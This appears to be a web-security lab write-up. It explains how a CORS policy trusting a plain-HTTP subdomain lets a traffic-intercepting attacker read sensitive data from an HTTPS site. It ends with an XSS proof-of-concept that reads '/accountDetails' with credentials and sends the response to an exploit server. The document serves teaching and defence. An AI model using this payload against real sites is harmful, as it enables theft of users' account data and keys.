# Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

The application responds with:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:

* The victim user makes any plain HTTP request.
*   The attacker injects a redirection to:

    ```
    http://trusted-subdomain.vulnerable-website.com
    ```
* The victim's browser follows the redirect.
*   The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:

    ```
    https://vulnerable-website.com
    ```
*   The victim's browser makes the CORS request, including the origin:

    ```
    http://trusted-subdomain.vulnerable-website.com
    ```
* The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
* The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

**This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.**



#### Proof of Concept via XSS

```html
<script>
    document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
